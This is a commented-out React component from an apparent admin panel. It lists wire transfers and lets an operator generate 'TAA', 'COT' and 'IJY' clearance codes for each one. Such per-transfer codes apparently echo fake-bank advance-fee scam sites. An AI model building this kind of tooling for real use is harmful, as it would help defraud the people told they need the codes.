// 'use client';

// import { useState } from 'react';
// import { generateClearanceCodes } from '@/actions/admin';
// import styles from './admin.module.css';

// export default function WireRow({ wire, userEmail }: { wire: any, userEmail: string }) {
//     const [codes, setCodes] = useState<{ taa?: string, cot?: string, ijy?: string } | null>(
//         wire.taaCode ? { taa: wire.taaCode, cot: wire.cotCode, ijy: wire.ijyCode } : null
//     );
//     const [loading, setLoading] = useState(false);

//     const handleGenerate = async () => {
//         setLoading(true);
//         const result = await generateClearanceCodes(wire.id);
//         if (result.codes) {
//             setCodes(result.codes);
//         }
//         setLoading(false);
//     };

//     return (
//         <tr>
//             <td>
//                 <div className={styles.userName}>{wire.bankName}</div>
//                 <div className={styles.userId}>{userEmail}</div>
//             </td>
//             <td>
//                 {new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(Number(wire.amount))}
//             </td>
//             <td>
//                 <span className={styles.badge} style={{ background: '#333' }}>
//                     {wire.currentStage}
//                 </span>
//             </td>
//             <td style={{ minWidth: '300px' }}>
//                 {codes ? (
//                     <div style={{ display: 'grid', gap: '5px', fontSize: '0.8rem', fontFamily: 'monospace' }}>
//                         <div style={{ color: '#fbbf24' }}>TAA: {codes.taa}</div>
//                         <div style={{ color: '#60a5fa' }}>COT: {codes.cot}</div>
//                         <div style={{ color: '#a78bfa' }}>IJY: {codes.ijy}</div>
//                     </div>
//                 ) : (
//                     <span style={{ color: '#666', fontSize: '0.8rem' }}>Waiting for generation...</span>
//                 )}
//             </td>
//             <td>
//                 {!codes ? (
//                     <button
//                         onClick={handleGenerate}
//                         disabled={loading}
//                         className={styles.actionBtn}
//                         style={{ background: '#2563eb', color: '#fff', width: 'auto' }}
//                     >
//                         {loading ? 'Generating...' : '⚡ Generate Codes'}
//                     </button>
//                 ) : (
//                     <div style={{ color: '#4ade80', fontSize: '0.8rem', fontWeight: 'bold' }}>
//                         ✓ Ready to Send
//                     </div>
//                 )}
//             </td>
//         </tr>
//     );
// }